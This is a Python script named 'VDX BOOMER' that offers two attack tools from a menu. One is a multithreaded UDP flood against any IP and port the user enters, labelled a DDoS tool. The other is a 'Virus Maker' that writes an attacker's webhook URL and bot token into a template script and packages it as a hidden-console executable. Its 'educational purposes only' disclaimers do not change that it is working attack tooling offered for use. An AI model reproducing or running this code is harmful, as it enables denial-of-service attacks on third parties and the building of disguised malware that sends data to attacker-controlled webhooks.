import os
import time
import socket
import threading
import logging
import subprocess
import sys
import random
import shutil
import socks  # PySocks library for SOCKS proxy
import re

def create_directories():
    os.makedirs('debug/last', exist_ok=True)

def get_user_inputs():
    print("\n[+] Enter configuration values:")
    webhook = input("Webhook URL: ")
    token = input("Bot Token: ")
    exe_choice = input("Create executable? (y/n): ").lower()
    hide_console = input("Hide console? (y/n): ").lower()
    return webhook, token, exe_choice == 'y', hide_console == 'y'

def clone_and_modify(webhook, token):
    template_path = os.path.join('debug', 'example.py')
    
    if not os.path.exists(template_path):
        print(f"[!] Error: Template file {template_path} not found!")
        exit(1)

    existing = [f for f in os.listdir('debug') 
               if f.startswith('example') 
               and f.endswith('.py') 
               and f != 'example.py']
    
    numbers = [int(re.search(r'example(\d+).py', f).group(1)) 
               for f in existing if re.match(r'example\d+.py', f)]
    
    next_num = max(numbers) + 1 if numbers else 1
    new_name = f'example{next_num}.py'
    dest_path = os.path.join('debug', 'last', new_name)

    try:
        with open(template_path, 'r', encoding='utf-8') as f:
            content = f.read()
    except UnicodeDecodeError:
        with open(template_path, 'r', encoding='latin-1') as f:
            content = f.read()

    replacements = [
        (r'(?i)^(\s*webhook_url\s*=\s*[\'"])(.*?)([\'"])', 
         f'\\1{webhook}\\3'),
        (r'(?i)^(\s*token\s*=\s*[\'"])(.*?)([\'"])', 
         f'\\1{token}\\3')
    ]

    for pattern, replacement in replacements:
        content, count = re.subn(
            pattern,
            replacement,
            content,
            flags=re.MULTILINE | re.IGNORECASE
        )
        if count == 0:
            print(f"[!] Warning: No replacements made for pattern: {pattern}")
        else:
            print(f"[+] Made {count} replacement(s) for pattern: {pattern}")

    with open(dest_path, 'w', encoding='utf-8') as f:
        f.write(content)
    
    print(f"[DEBUG] Modified content preview:\n{content[:500]}...")
    return dest_path

def convert_to_exe(py_path, hide_console):
    exe_name = os.path.splitext(os.path.basename(py_path))[0]
    build_dir = os.path.join('debug', 'last')
    
    cmd = [
        'pyinstaller',
        '--onefile',
        '--distpath', build_dir,
        '--workpath', os.path.join(build_dir, 'build'),
        '--specpath', build_dir,
        '--noconsole' if hide_console else '',
        py_path
    ]
    
    cmd = [arg for arg in cmd if arg]

    try:
        subprocess.run(cmd, check=True)
        print(f"\n[+] Executable created: {os.path.join(build_dir, exe_name)}")
        
        for f in os.listdir(build_dir):
            path = os.path.join(build_dir, f)
            if f.endswith('.spec') or f == 'build':
                (shutil.rmtree if os.path.isdir(path) else os.remove)(path)
                
    except Exception as e:
        print(f"\n[!] Executable creation failed: {e}")

def main():
    create_directories()
    
    if not os.path.exists(os.path.join('debug', 'example.py')):
        print("[!] Error: Create 'debug/example.py' first with these placeholders:")
        print("webhook_url = \"YOUR_WEBHOOK_URL\"")
        print("token = \"YOUR_BOT_TOKEN\"")
        return

    webhook, token, make_exe, hide_console = get_user_inputs()
    cloned_file = clone_and_modify(webhook, token)
    
    print(f"\n[+] New clone created: {cloned_file}")
    
    if make_exe:
        print("\n[+] Building executable...")
        convert_to_exe(cloned_file, hide_console)

def send_packets(ip, port, data, rate_limit):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            sock.sendto(data, (ip, port))
            print(f"[+] Sent {len(data)} bytes to {ip}:{port}")
            sock.close()
            
        except Exception as e:
            print(f"[-] Error: {e}")
            time.sleep(2)
        
        time.sleep(rate_limit + random.uniform(-0.05, 0.1))

def ddos():
    print("=== Educational DDOS Tool ===")
    print("WARNING: For educational/legitimate testing purposes only!")
    
    ip = input("Enter the target IP: ")
    port = int(input("Enter the Port: "))
    data_size = int(input("Enter the Packet size (e.g 1000): "))
    rate_limit = 0.1
    threads = int(input("Enter threads (e.g 135): "))
    
    data = ("GET / HTTP/1.1\r\n"
            f"Host: {ip}\r\n"
            "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
            "Accept: */*\r\n\r\n").encode()
    
    print(f"[+] Starting attack on {ip}:{port}...")
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=send_packets, args=(ip, port, data, rate_limit))
        t.daemon = True
        threads_list.append(t)
        t.start()
    
    try:
        while True:
            time.sleep(1)
            alive = sum(1 for t in threads_list if t.is_alive())
            print(f"[*] Active threads: {alive}/{threads}")
            
            if alive < threads:
                for _ in range(threads - alive):
                    t = threading.Thread(target=send_packets, args=(ip, port, data, rate_limit))
                    t.daemon = True
                    threads_list.append(t)
                    t.start()
                    
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")

def print_colored(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")

disclaimer = """
Disclaimer: This script is for educational purposes only.
The author is not responsible for any actions taken based on the use of this code.
Use at your own risk. Ensure that you comply with all relevant laws and regulations.

By pressing Enter, you agree to the terms above.
"""

print_colored(r"""
 ___      ___ ________     ___    ___      ________  ________  ________  _____ ______   _______   ________     
|\  \    /  /|\   ___ \   |\  \  /  /|    |\   __  \|\   __  \|\   __  \|\   _ \  _   \|\  ___ \ |\   __  \    
\ \  \  /  / | \  \_|\ \  \ \  \/  / /    \ \  \|\ /\ \  \|\  \ \  \|\  \ \  \\\__\ \  \ \   __/|\ \  \|\  \   
 \ \  \/  / / \ \  \ \\ \  \ \    / /      \ \   __  \ \  \\\  \ \  \\\  \ \  \\|__| \  \ \  \_|/_\ \   _  _\  
  \ \    / /   \ \  \_\\ \  /     \/        \ \  \|\  \ \  \\\  \ \  \\\  \ \  \    \ \  \ \  \_|\ \ \  \\  \| 
   \ \__/ /     \ \_______\/  /\   \         \ \_______\ \_______\ \_______\ \__\    \ \__\ \_______\ \__\\ _\ 
    \|__|/       \|_______/__/ /\ __\         \|_______|\|_______|\|_______|\|__|     \|__|\|_______|\|__|\|__|
                          |__|/ \|__|                                                                          
 """, "1;36;40")
print_colored("        0.10 beta ver", "1;36;40")
input(disclaimer)

def display_menu():
    print_colored("""                                   
      Welcome to VDX BOOMER 
                  
      (1) <DDOS IP>
      (2) <Virus Maker>
    """, "1;36;40")

if __name__ == "__main__":
    while True:
        display_menu()
        choice = input("Choose an option: ")

        if choice == "1":
            ddos()
        elif choice == "2":
            main()
        else:
            print("Invalid option, please try again.")
        print_colored("Press Enter to continue...", "1;31;40")
        input()
